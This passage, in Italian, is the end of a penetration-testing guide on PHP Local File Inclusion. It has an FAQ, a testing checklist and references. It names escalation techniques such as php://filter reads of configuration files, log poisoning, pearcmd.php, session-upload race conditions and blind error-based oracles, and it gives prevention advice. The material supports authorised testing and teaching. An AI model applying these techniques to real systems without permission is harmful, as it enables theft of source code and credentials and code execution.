## FAQ

**La LFI è sempre RCE?**
No. Da sola è quasi sempre un file read. Diventa RCE solo in presenza di una delle condizioni descritte sopra.

**Qual è la differenza tra LFI e Path Traversal?**
Il Path Traversal è la manipolazione del percorso per uscire dalla cartella prevista; la LFI è l'inclusione di quel percorso in una funzione che interpreta il contenuto come codice.

**`php://filter` funziona sempre?**
Funziona su qualunque versione di PHP per leggere file, indipendentemente da `allow_url_include`. Non richiede prerequisiti particolari, a differenza di `php://input` e `data://`.

**La PHP filter chain funziona su qualsiasi LFI?**
No. Serve che il parametro vulnerabile accetti uno stream wrapper come valore, e la tecnica nella sua forma attuale perde affidabilità su PHP 8.6+ per via del limite di 16 filtri introdotto dalla relativa RFC.

**Come prevengo una LFI in PHP?**
Con una whitelist lato server che mappa l'input a percorsi fissi, mai costruendo un percorso a partire da input dell'utente, nemmeno con prefisso e suffisso.

**Esiste un modo per sfruttare una LFI completamente cieca?**
Sì, con la tecnica dell'oracolo error-based, o con le tecniche basate su race condition (session, upload, phpinfo). Sono più lente ma funzionano anche senza output riflesso.

## Checklist

* ☐ Parametro confermato con ffuf, falso positivo escluso (prefisso/suffisso)
* ☐ `php://filter/convert.base64-encode` tentato per leggere sorgente e configurazioni
* ☐ `allow_url_include` dedotto dal comportamento di `php://input` e `data://`
* ☐ Versione di PHP verificata prima di investire tempo sulla filter chain
* ☐ `register_argc_argv` verificato prima di tentare `pearcmd.php`
* ☐ Permessi dei file di log verificati prima di escludere o promettere il log poisoning
* ☐ Race condition su `PHP_SESSION_UPLOAD_PROGRESS` tentata se log poisoning non è percorribile
* ☐ Oracolo error-based o tecniche race considerate se la LFI è cieca
* ☐ Nel report: distinzione chiara tra file read dimostrato, RCE dimostrata e passaggi successivi non verificati

## Riferimenti tecnici

* [PHP Manual — `include()`](https://www.php.net/manual/en/function.include.php)
* [PHP Manual — wrapper `php://`](https://www.php.net/manual/en/wrappers.php.php)
* [PHP Manual — wrapper `data://`](https://www.php.net/manual/en/wrappers.data.php)
* [OWASP WSTG — Testing for Local File Inclusion](https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion/)
* [RFC PHP — Limit maximum number of filter chains](https://wiki.php.net/rfc/limit-maximum-number-of-filter-chains)
* [Synacktiv — PHP filter chains: file read from error-based oracle](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle)

Usa queste tecniche solo su sistemi per cui hai un'autorizzazione scritta, o in laboratori come quello di questa guida.
